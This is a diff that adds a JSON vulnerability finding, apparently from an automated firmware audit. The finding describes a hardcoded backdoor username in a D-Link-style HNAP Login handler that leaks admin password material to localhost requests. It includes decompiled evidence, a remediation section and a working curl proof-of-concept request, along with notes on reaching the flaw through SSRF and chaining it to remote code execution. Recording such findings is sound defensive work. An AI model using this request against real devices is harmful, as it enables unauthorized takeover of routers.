@@ -1,0 +1,29 @@
+{
+  "job_id": "9160aafaa095",
+  "title": "HNAP Login 预认证动作存在硬编码后门用户名 0A2326B60AB94BC（localhost 来源可泄露管理员口令材料）",
+  "severity": "medium",
+  "confidence": 0.6,
+  "vuln_class": "硬编码凭据后门",
+  "cwe": "CWE-798",
+  "binary_md5": "b18be6d07f1c97903c063686924ed3c7",
+  "binary_path": "firmware/binwalk_extracted/firmware.extracted/0/decrypted.bin.extracted/56CD97/squashfs-root/bin/httpd",
+  "reachability": "static-only",
+  "summary": "httpd 的 HNAP Login 动作处理器 sub_47B918（预认证动作）在 Action==\"request\" 分支内保留了一段硬编码后门：当请求参数 Username 与字面量 \"0A2326B60AB94BC\" 匹配（strncmp 的长度取自攻击者的 strlen(Username)，因此任意前缀如 \"0\"、\"0A\" 都能命中）且来源 IP 为 127.0.0.1 时，直接跳过口令校验，从 csman 读取管理员账号/口令材料（read_csman(...,-2147466621,...)、csman 66437 公钥）并按正常登录成功路径构造响应（sub_424384 派生 Cookie/Challenge/PublicKey/PrivateKey），等价于向调用方泄露管理员凭据材料。\n\n这是 D-Link HNAP 的典型硬编码后门（\"0A2326B60AB94BC\" 为固定用户名），且前缀比较写法使匹配面进一步扩大。远程利用被 127.0.0.1 判断阻断，但一旦存在令设备自请求回环地址的能力（本机 shell、任何 SSRF/URL 拉取链、或运维/云代理路径），即可在无口令情况下拿到管理员会话材料并进一步调用 SetDeviceSettings/SetMultipleActions 等写动作（与 F-mudgub44-554b 形成认证绕过→RCE 链）。",
+  "evidence": [
+    "httpd 反编译 sub_47B918 @0x47b918（Action==\"request\" 分支）：v19 = strlen(v15); if (!strncmp(v15, \"0A2326B60AB94BC\", v19)) { v74[0]=2130706433; if (dword_4F0154==2130706433) { read_csman(...,-2147466621,v73,512,4); read_csman(*v21,66437,v75,17,4); goto LABEL_18; } return -401; }",
+    "比较长度取自攻击者提供的 strlen(Username)，因此 \"0\"、\"0A\"、\"0A2326\" 等任意前缀都能通过该硬编码用户名校验（strncmp 按短串长度比较）",
+    "dword_4F0154 的来源：sub_47C1C0 @0x47c1c0 中 dword_4F0154 = *(a1+48)；sub_408A0C @0x408a0c 中 conn+48 = v3[2]（accept 时写入的 socket 对端地址），sub_42131C @0x42131c 用 a1[12]==0x7F000001 && a1[8]==8 判断 loopback，说明该字段是真实客户端 IP，不可由请求头伪造",
+    "LABEL_18 之后的 sub_424384(username, 口令, cookie, challenge, publickey, privatekey, ...) 会用读取到的口令派生会话私钥并以响应返回，等价于向调用方泄露管理员口令材料",
+    "该分支是 Login 动作（预认证动作，HNAP 动作表 off_4ED9B0 中 Login 无需会话），无需任何凭据即可到达硬编码用户名比较"
+  ],
+  "session_id": "s-mudg5kk4-3b8e",
+  "preconditions": "请求源 IP 必须是 127.0.0.1（代码用 dword_4F0154 == 0x7F000001 硬校验，该值来自 accept 得到的 socket 对端地址，不能通过 X-Forwarded-For 之类的请求头伪造）；动作名为主 SOAPAction/API-ACTION 头中的 Login。因此远程直接利用不可行，需要设备自身发起请求（本机 shell、被映射的端口转发回环、或任何能让 httpd 拉取 127.0.0.1 URL 的 SSRF）。",
+  "remediation": "删除 HNAP Login 处理器中针对用户名 \"0A2326B60AB94BC\" 的整段特判分支（以及 sub_470F24 中 \"24601\"/\"Medeleine\" 之类调试/产线后门逻辑）；管理员口令与公钥不得在未鉴权响应中返回；如确需本机自动登录，应改用只读的一次性令牌并校验来源进程/接口，而不是依赖可被绕过的 127.0.0.1 判断。",
+  "poc": "在设备本机（或任何能令设备自我请求 127.0.0.1 的场景，如存在 SSRF 的 URL 拉取功能）执行：\ncurl -s -X POST http://127.0.0.1/HNAP1/ -H 'Content-Type: text/xml' -H 'SOAPAction: \"http://purenetworks.com/HNAP1/Login\"' --data '<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><Login xmlns=\"http://purenetworks.com/HNAP1/\"><Action>request</Action><Username>0A2326B60AB94BC</Username><LoginPassword>x</LoginPassword></Login></soap:Body></soap:Envelope>'\n（Username 用任意前缀如 \"0\" 亦可命中）",
+  "call_chain": "HNAP Login 动作包装 sub_47C1C0(0x47c1c0) → 登录处理 sub_47B918(0x47b918) → 硬编码用户名比较 strncmp(Username,\"0A2326B60AB94BC\",strlen(Username)) → 客户端 IP 判断 dword_4F0154==0x7F000001 → read_csman/read_csman_int(65538、66437、-2147466621) → 随 Login 响应返回管理员用户名/口令哈希与公钥",
+  "id": "F-mudgunur-a48b",
+  "status": "draft",
+  "owner": "token-admin",
+  "recorded_at": "2026-09-23T02:10:44Z",
+  "history": []
+}
